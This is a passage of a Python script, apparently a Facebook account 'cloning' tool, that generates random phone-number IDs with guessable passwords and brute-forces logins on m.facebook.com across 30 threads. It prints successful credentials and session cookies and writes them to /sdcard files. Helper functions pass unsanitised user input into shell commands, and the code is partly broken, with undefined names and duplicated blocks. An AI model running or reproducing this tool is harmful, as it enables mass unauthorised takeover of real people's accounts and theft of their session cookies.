        nmp1 = ''.join(random.choice(string.digits) for _ in range(2))
        nmp2 = ''.join(random.choice(string.digits) for _ in range(1))
        nmp3 = ''.join(random.choice(string.digits) for _ in range(4))

        user.append(nmp1)
        user.append(nmp2)
        user.append(nmp3)

    with ThreadPool(max_workers=30) as RAKAworld:
        # Assuming there's a clear() function defined somewhere
        tl = str(len(user))
        print(' total IDS : \033[1;32m' + tl + f' ')
        print(f'\033[1;34m CHOICE CODE  :\033[1;32m ' + code)
        print(" [\033[1;92m\033[1;41m  Use Airplane mode For Speed up Cloning  \033[0m\033[1;93m]")

        for psx in user:
            psx1 = psx[:2]
            psx2 = psx[:1]
            psx3 = psx[:4]
            
            ids = code + psx1 + psx2 + psx3
            passlist = [psx1+psx2+psx3,code+psx1,code+psx1+psx2, ids, 'khan1122', 'khan1212', 'khankhan']

            # Assuming you want to submit tasks to the ThreadPoolExecutor here
            RAKAworld.submit(rndm,ids,passlist,user)
    
    print('\033[1;37m')
    print(' The process has completed')
    print(' total OK/CP: '+str(len(oks))+'/'+str(len(cps)))

from concurrent.futures import ThreadPoolExecutor
import random
import string

oks = []  # Assuming these are defined somewhere in your code
cps = []  # Assuming these are defined somewhere in your code
def bd():
    user = []
    clear()
    print('\033[1;33m     CODE EXAMPLE 👉👉👉\033[1;32m 018   019   079   088')
    code = input('\033[1;32m[+]PUT CODE: ')

    try:
        limit = int(input('\033[1;33mSELECT LIMIT: \n     \033[1;34m 2000, 3000, 5000, 10000\n\033[1;32m[+]LIMIT: '))
    except ValueError:
        limit = 50000

    clear()

    for nmbr in range(limit):
        # Generate three different strings with varying lengths
        nmp1 = ''.join(random.choice(string.digits) for _ in range(2))
        nmp2 = ''.join(random.choice(string.digits) for _ in range(2))
        nmp3 = ''.join(random.choice(string.digits) for _ in range(4))

        user.append(nmp1)
        user.append(nmp2)
        user.append(nmp3)

    with ThreadPool(max_workers=30) as RAKAworld:
        # Assuming there's a clear() function defined somewhere
        tl = str(len(user))
        print(' total IDS : \033[1;32m' + tl + f' ')
        print(f'\033[1;34m CHOICE CODE  :\033[1;32m ' + code)
        print(" [\033[1;92m\033[1;41m  Use Airplane mode For Speed up Cloning  \033[0m\033[1;93m]")

        for psx in user:
            psx1 = psx[:2]
            psx2 = psx[:2]
            psx3 = psx[:4]
            
            ids = code + psx1 + psx2 + psx3
            passlist = [psx2 + psx3, code + psx1 + psx2, ids, 'khan1122', 'khan1212', 'khankhan']

            # Assuming you want to submit tasks to the ThreadPoolExecutor here
            RAKAworld.submit(rndm,ids,passlist,user)
    
    print('\033[1;37m')
    print(' The process has completed')
    print(' total OK/CP: '+str(len(oks))+'/'+str(len(cps)))

def afg():
    user = []
    clear()
    print('\033[1;33m     CODE EXAMPLE 👉👉👉\033[1;34m 9374    9378    9379')
    code = input('\033[1;32m[+]PUT CODE: ')

    try:
        limit = int(input('\033[1;33mSELECT LIMIT: \n     \033[1;34m 2000, 3000, 5000, 10000\n\033[1;32m[+]LIMIT: '))
    except ValueError:
        limit = 50000

    clear()

    for nmbr in range(limit):
        # Generate three different strings with varying lengths
        nmp1 = ''.join(random.choice(string.digits) for _ in range(2))
        nmp2 = ''.join(random.choice(string.digits) for _ in range(1))
        nmp3 = ''.join(random.choice(string.digits) for _ in range(4))

        user.append(nmp1)
        user.append(nmp2)
        user.append(nmp3)

    with ThreadPool(max_workers=30) as RAKAworld:
        # Assuming there's a clear() function defined somewhere
        tl = str(len(user))
        print(' total IDS : \033[1;32m' + tl + f' ')
        print(f'\033[1;34m CHOICE CODE  :\033[1;32m ' + code)
        print(" [\033[1;92m\033[1;41m  Use Airplane mode For Speed up Cloning  \033[0m\033[1;93m]")

        for psx in user:
            psx1 = psx[:2]
            psx2 = psx[:1]
            psx3 = psx[:4]
            
            ids = code + psx1 + psx2 + psx3
            passlist = [psx1+psx2+psx3,code+psx1,code+psx1+psx2, ids, 'khan1122', 'khan1212', 'khankhan']

            # Assuming you want to submit tasks to the ThreadPoolExecutor here
            RAKAworld.submit(rndm,ids,passlist,user)
    
    print('\033[1;37m')
    print(' The process has completed')
    print(' total OK/CP: '+str(len(oks))+'/'+str(len(cps)))

import sys
import random
import re
import requests

def rndm(ids, passlist, user):
    try:
        global ok, loop
        sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mRAKA\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
        sys.stdout.flush()

        for pw in passlist:
            session = requests.Session()
            ua = random.choice(uaku2)

            free_fb = session.get('https://m.facebook.com').text

            log_data = {
                "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
                "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
                "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
                "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
                "try_number": "0",
                "unrecognized_tries": "0",
                "email": ids,
                "pass": pw,
                "login": "Log In"
            }

            header_freefb = {
                'authority': 'm.facebook.com',
                'viewport-width': '980',
                'upgrade-insecure-requests': '1',
                'method': 'path',
                'scheme': 'https',
                'viewport-width': '980',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9',
                'dpr': '3',
                'sec-ch-prefers-color-scheme': 'light',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.70"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-model': '"Infinix X663"',
                'sec-ch-ua-platform': '"Android"',
                'sec-ch-ua-platform-version': '"12.0.0"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'upgrade-insecure-requests': '1',
                'user-agent':generate_user_agent_2(),}

            lo = session.post('https://m.facebook.com/login/?ref=dbl&fl&login_from_aymh=1', data=log_data,
                              headers=header_freefb).text

            log_cookies = session.cookies.get_dict().keys()

            if 'c_user' in log_cookies:
                coki = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
                cid = coki[7:22]

                print('\033[1;92m[RAKA-Ok] ' + ids + ' | ' + pw + '\033[0;97m')
                print(f"\033[1;97m[[S] COOKIE\033[1;97m][👉] :\033[1;92m {coki}")
                cek_apk(session,coki)
                open('/sdcard/TOUSEE-OK.txt', 'a').write(ids+' | '+pw+'\n')
                open('/sdcard/TOUSEE-COKIES.txt', 'a').write(ids + ' | ' + pw + ' | ' + coki + '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
                cid = coki[24:39]

                print('\033[1;31m[RAKA-CP] ' + ids + ' | ' + pw + '\033[0;97m')

                open('/sdcard/RAKA-CP.txt', 'a').write(ids + ' | ' + pw + '\n')

                cps.append(cid)
                break
            else:
                continue

        loop += 1
        
    except:
        pass
def removef():
        os.system('rm -rf self.file');print(f'\n{R}Files Removed Successfully ...')
        RAKA(Allkey)

def sids():
    os.system('clear')
    print(logo)
    try:
        file_name = input('Put File Name: ')
        open(file_name,'r').read()
    except FileNotFoundError:
        print(' File not found.')
        exit()
    clear()
    print('\033[1;37mPut limit between 1 to 10 \033[0;97m')
    limit = int(input('How many links do you want to separate?: '))
    clear()
    print('\033[1;37mExample: /sdcard/RAKA.txt\033[0;97m')
    print(47*'-')
    new_save = input('Save new file as: ')
    clear()
    print('\033[1;37mExample: 10008,10007,10006')
    print(47*'-')
    y = 0
    for k in range(limit):
        y+=1
        links = input('Put links %s: '%(y))
        os.system('cat '+file_name+' | grep "'+links+'" >> '+new_save)
    print(47*'-')
    print('Links grabbed successfully')
    print('total grabbed links: '+str(len(open(new_save).read().splitlines())))
    print('New file saved as: '+new_save)
    print(47*'-')
    input('Press enter to back Menu ')
    RAKA(Allkey)
    
def cutter():
    os.system('clear')
    print(logo)
    print("Enter File Path / File Location \n")
    raka = input('Put File Name :')
    print(" ")
    RA12 = input('Saving Put File Name :')
    os.system('touch ' +RA12)
    os.system('sort -r '+raka+' | uniq > '+RA12)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + raka )
    print(47*'-')
    print("File Saved To :" + RA12 )
    print(47*'-')
    input(f"{S} Press Enter To Back RAKA Menu ")
    RAKA() 

RAKA()